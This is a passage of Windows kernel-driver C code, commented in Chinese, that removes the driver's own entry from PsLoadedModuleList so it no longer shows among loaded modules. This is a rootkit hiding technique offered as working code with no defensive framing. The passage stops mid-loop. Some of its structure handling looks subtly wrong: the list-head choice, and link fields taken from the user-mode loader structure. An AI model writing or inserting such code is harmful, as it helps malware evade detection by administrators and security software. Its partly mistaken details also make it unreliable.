// 从 PsLoadedModuleList 摘除自身 LDR 项
VOID HideFromModuleList() {
    PLIST_ENTRY head = PsLoadedModuleList.Flink;          // 链表头
    PLIST_ENTRY cur  = head->Flink;
    PLDR_DATA_TABLE_ENTRY ldr = NULL;

    while (cur != head) {
        ldr = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (ldr->DllBase == g_DriverBase) {               // g_DriverBase 驱动加载时记录
            // 1) 摘链
            RemoveEntryList(&ldr->InLoadOrderLinks);
            InitializeListHead(&ldr->InLoadOrderLinks);
            RemoveEntryList(&ldr->InMemoryOrderLinks);
            InitializeListHead(&ldr->InMemoryOrderLinks);
            RemoveEntryList(&ldr->InInitializationOrderLinks);
            InitializeListHead(&ldr->InInitializationOrderLinks);
            break;
        }
        cur = cur->Flink;
